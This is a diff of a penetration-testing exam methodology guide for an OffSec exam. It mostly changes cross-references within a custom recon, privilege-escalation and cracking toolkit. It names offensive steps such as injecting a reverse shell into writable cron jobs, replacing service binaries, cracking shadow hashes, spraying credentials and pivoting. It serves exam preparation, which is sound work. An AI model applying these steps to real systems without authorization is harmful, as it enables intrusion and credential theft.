@@ -98,7 +98,7 @@ recon.sh → read quick_wins.txt + summary.txt
   HTTP found? → webenum.sh → read summary.md + quick_wins.txt
   → exploit for foothold → SHELL
   → servr.sh → lootr (on target) + escalatr.sh (from Kali)
-  → read lootr attack_commands.txt first, then summary.txt
+  → read lootr summary.txt → act on findings (see Linux_PrivEsc.md / Windows_PrivEsc.md)
   → any hashes? → crackr.sh -q → sprayr.sh --from-creds      ← CREDENTIAL LOOP
   → root/SYSTEM? → evidencr.sh IMMEDIATELY → screenshot → submit flag
 ```
@@ -197,7 +197,7 @@ cat $TOOLKIT_ROOT/recon/IP/udp/snmp/running_processes.txt
    ```bash
    sudo ./recon.sh --auto --udp-full IP
    ```
-3. Still nothing? → Move to a different target. Come back after 1-2 hours with fresh eyes. Re-read recon, webenum, lootr, and escalatr output from the top.
+3. Still nothing? → Move to a different target. Come back after 1-2 hours with fresh eyes. Check `Stuck_Decision_Tree.md`.
 
 ---
 
@@ -237,7 +237,7 @@ cat $WEBDIR/vhosts/hosts_entries.txt
 
 ### Step 3 — Act on what you find
 
-Act on `summary.md`, `quick_wins.txt`, and `hosts_entries.txt`. The most common quick wins:
+Act on `summary.md`, `quick_wins.txt`, and `hosts_entries.txt` using the decision trees in `webenum.md` and `Web_App.md`. The most common quick wins:
 
 | Finding | Immediate Action |
 |---------|-----------------|
@@ -256,7 +256,7 @@ Act on `summary.md`, `quick_wins.txt`, and `hosts_entries.txt`. The most common 
 # >30 min with no foothold vector? → move to a different target
 ```
 
-If nothing in `quick_wins.txt` lands, go deep once, then move to manual web testing.
+Full technique detail for each finding type: see `webenum.md` and `Web_App.md`.
 
 ---
 
@@ -337,10 +337,10 @@ cat ~/loot/$HOST/summary.txt            # full findings overview
 | Writable cron | `files/cron_jobs.txt` | Writable script | Inject reverse shell, wait for execution |
 | Shadow hashes | `creds/shadow_hashes.txt` | Hashes present | `./crackr.sh --unshadow` → `su` → `sprayr.sh --from-creds` |
 | SSH keys | `creds/key_*` | Key file | Try unencrypted first → if passphrase → `./crackr.sh -e ssh` |
-| Local-only services | `network/internal_listeners.txt` | 127.0.0.1:PORT | `./pivotr.sh ssh --type local --pivot-ip TARGET_IP --target-ip 127.0.0.1 --target-port PORT --local-port PORT` |
+| Local-only services | `network/internal_listeners.txt` | 127.0.0.1:PORT | SSH port-forward → investigate |
 | New subnets | `network/reachable_subnets.txt` | Subnet | Note for Phase 9 (pivotr) after rooting |
 
-Full exploit commands should be in `attack_commands.txt`; use the table above only as fallback context.
+Full technique detail for each finding type: see `Linux_PrivEsc.md`.
 
 **Nothing in the table?** → Continue to Phase 5 (escalatr.sh for linpeas).
 
@@ -390,7 +390,7 @@ Get-Content "$R\summary.txt"            # full findings overview
 | Writable service binaries | `files\writable_service_binaries.txt` | Writable binary | Replace binary → restart service |
 | Local-only services | `network\internal_listeners.txt` | 127.0.0.1:PORT | Port-forward via chisel/pivotr |
 
-Full exploit commands should be in `attack_commands.txt`; use the table above only as fallback context.
+Full technique detail for each finding type: see `Windows_PrivEsc.md`.
 
 > [!warning] Do NOT use `.\lootr.ps1 -Quick` when looking for privesc vectors. Quick mode skips AlwaysInstallElevated, unquoted paths, and DLL hijack checks — the three easiest Windows wins.
 
@@ -478,7 +478,7 @@ copy \\KALI_IP\tools\winPEASx64.exe C:\Windows\Temp\
 C:\Windows\Temp\winPEASx64.exe | Tee-Object C:\Windows\Temp\winpeas_output.txt
 ```
 
-### Step 3 — Parse and read quick-wins
+### Step 3 — Parse and read attack commands first
 
 ```bash
 ./escalatr.sh --parse /tmp/linpeas_output.txt
@@ -486,11 +486,11 @@ cat $TOOLKIT_ROOT/privesc/TARGET_IP/attack_commands.txt    # ★ START HERE — 
 cat $TOOLKIT_ROOT/privesc/TARGET_IP/quick-wins.txt         # full parsed findings
 ```
 
-**Decision:** Act on any findings using `attack_commands.txt` first, then the same priority tables from Phase 3 (Linux or Windows).
+**Decision:** Act on any findings using the same priority tables from Phase 3 (Linux or Windows). The technique detail is in `Linux_PrivEsc.md` and `Windows_PrivEsc.md`.
 
 **escalatr catches things lootr doesn't:** config files with passwords, writable PATH directories, Docker/LXC group membership (Linux), scheduled tasks with writable scripts (Windows), kernel version + known exploits (last resort — unreliable, can crash the box).
 
-**Nothing from either lootr or escalatr?** → Re-read recon and webenum output. Consider whether you missed a web vector (Phase 1b) or whether this box requires pivoting from another compromised host.
+**Nothing from either lootr or escalatr?** → Check `Stuck_Decision_Tree.md`. Consider whether you missed a web vector (Phase 1b) or whether this box requires pivoting from another compromised host.
 
 ---
 
@@ -968,7 +968,7 @@ Do this right now, not later. Copy the flag value and submit it in the OffSec en
    → Re-run with --batch-size 500 (network congestion)
    → Run --udp-full (full UDP scan)
    → Still nothing? → Move to different target, come back in 1-2 hours
-   → Re-read recon, webenum, lootr, and escalatr output from the top
+   → Check Stuck_Decision_Tree.md
 ```
 
 ### "I have a Windows shell with low privs — what are the fast wins?"
@@ -993,7 +993,7 @@ Do this right now, not later. Copy the flag value and submit it in the OffSec en
    → Look for non-standard services or scheduled tasks running as SYSTEM
 
 4. Truly nothing?
-   → Re-read recon, lootr, escalatr, and credential output from the top
+   → Check Stuck_Decision_Tree.md
    → Consider: did you miss a web vector? A different user path?
 ```
 
@@ -1068,7 +1068,7 @@ Do this right now, not later. Copy the flag value and submit it in the OffSec en
 | T+2h | 0 flags on current target | STOP this target. Move to a different one. Fresh eyes beat tunnel vision. |
 | T+3h | < 2 flags total | **AD is your fastest path to 40 points.** If you have assumed-breach creds and haven't started AD yet, start NOW: `adr.sh --quick` → crack → spray → `--chain` → BloodHound. |
 | T+4.5h | AD chain complete, no DA path | Park AD. Collect standalone points first. Come back after more creds surface. |
-| T+6h | < 3 flags total | Re-read ALL recon, webenum, lootr, and escalatr output for every target — you missed something. |
+| T+6h | < 3 flags total | Run Stuck_Decision_Tree.md for every target. Re-read ALL lootr/recon output — you missed something. |
 | T+18h | < 70 pts | **Stop attacking. Write the report for what you have.** Don't lose partial credit chasing points. |
 
 ---
@@ -1132,10 +1132,11 @@ All creds auto-logged to $TOOLKIT_ROOT/creds.txt by adr.sh, crackr.sh, sprayr.sh
 
 ## Related
 
-- [[OffSec_Methodology]] — full engagement attack chain
+- [[OffSec_Exam_Methodology_Complete]] — full engagement attack chain
+- [[Stuck_Decision_Tree]] — when you're genuinely stuck
 - [[Creds_Tracker]] — live credential tracking
 - [[Active_Directory]] — manual AD techniques
-- [[recon]] — recon.sh cheatsheet
+- [[scripts/recon]] — recon.sh cheatsheet
 - [[webenum]] — webenum.sh cheatsheet
 - [[crackr]] — crackr.sh cheatsheet
 - [[lootr]] — lootr.sh / lootr.ps1 cheatsheet
@@ -1145,5 +1146,5 @@ All creds auto-logged to $TOOLKIT_ROOT/creds.txt by adr.sh, crackr.sh, sprayr.sh
 - [[pivotr]] — pivotr.sh cheatsheet
 - [[servr]] — servr.sh cheatsheet
 - [[evidencr]] — evidencr.sh cheatsheet
-- [[tools_setup]] — tools_setup.sh installer/preflight
-- [[workflow]] — workflow.sh quick-reference
+- `tools_setup.sh` — installer/preflight
+- `workflow.sh` — quick-reference
